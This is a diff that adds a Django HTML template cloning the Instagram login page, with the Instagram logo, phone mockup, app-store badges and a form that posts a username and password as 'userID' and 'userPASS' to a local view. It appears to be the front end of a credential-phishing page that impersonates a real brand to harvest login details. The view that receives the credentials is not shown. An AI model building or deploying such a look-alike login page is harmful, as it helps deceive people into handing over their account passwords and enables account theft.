@@ -1,0 +1,60 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous">
+		<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+		<link rel="stylesheet" href="{%static 'all/css/main.css' %}">
+		<title>Document</title>
+	</head>
+	<body>
+		<section class="content-aria">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-6 image-area">
+						<img src="{%static 'all/img/phones.png'%}" alt="">
+					</div>
+					<div class="col-md-6">
+						<div class="input-area">
+							<img src="{%static 'all/img/instagram-logo.png'%}" alt="">
+							<form action="my_view/" method="post" > {% csrf_token %}
+								<input name="userID" type="text" placeholder ="Phone number, username, or email" > <br>
+								<input name="userPASS" type="password" placeholder="Password">
+								<br>
+								<button class="submit-btn" type="submit">Log In</button>
+								<!-- <button class="submit-btn" type="submit" > <a href="https://www.instagram.com/badhonbarman_/">Log In</a> </button> -->
+								<div class="or-with-border">
+									<hr class="left-border">
+									<h4>or</h4>
+									<hr class="right-border">
+									
+								</div>
+								<div class="fb-login">
+									<i class="fab fa-facebook-square"></i>
+									<a href="#">Login with Facebook</a>
+								</div>
+								<div class="forget-pass">
+									<a href="">forget password?</a>
+								</div>
+							</form>
+						</div>
+						<div class="sign-up-box">
+							<p>Don't have an account? <a href="#">Sign up</a> </p>
+						</div>
+						<div class="get-app-section">
+							<p>Get the app.</p>
+							<div class="store-icon">
+								<img style="margin-right: 7px;" src="{%static 'all/img/applestore.png'%}" alt="">
+								<img src="{%static 'all/img/googlestore.png'%}" alt="">
+							</div>
+						</div>
+					</div>
+				</div>
+				
+			<footer><img src="{%static 'all/img/fotter.png'%}" alt=""></footer>
+		</div>
+	</section>
+</body>
+</html>
